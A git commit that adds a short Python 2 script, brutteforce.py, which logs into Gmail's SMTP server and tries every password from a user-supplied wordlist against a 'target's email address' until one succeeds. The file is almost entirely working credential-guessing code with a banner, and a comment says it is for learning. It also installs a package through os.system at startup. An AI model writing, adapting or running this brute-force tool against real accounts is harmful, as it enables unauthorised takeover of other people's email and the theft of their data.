2b2f5c063b7cefaa5cefb043eaa47f8c449904f2
youhacker55 <57035255+youhacker55@users.noreply.github.com>
2020-09-23 13:22:37 -0400

    Create brutteforce.py

---
+++ brutteforce.py
@@ -0,0 +1,25 @@
+# simple brutteforce script you can use it to learn how this work 
+import os
+import smtplib    
+os.system("apt-get install figlet")
+os.system("clear")   
+print("just for you")
+os.system("figlet for Oxy")
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+ 
+user = raw_input("Enter the target's email address: ")
+passwfile = raw_input("Enter the password file name: ")
+passwfile = open(passwfile, "r")
+ 
+for password in passwfile:
+    try:
+        smtpserver.login(user, password)
+ 
+        print "[+] Password Found: %s" % password
+        break;
+    except smtplib.SMTPAuthenticationError:
+        print "[!] Password Incorrect: %s" % password
+
+
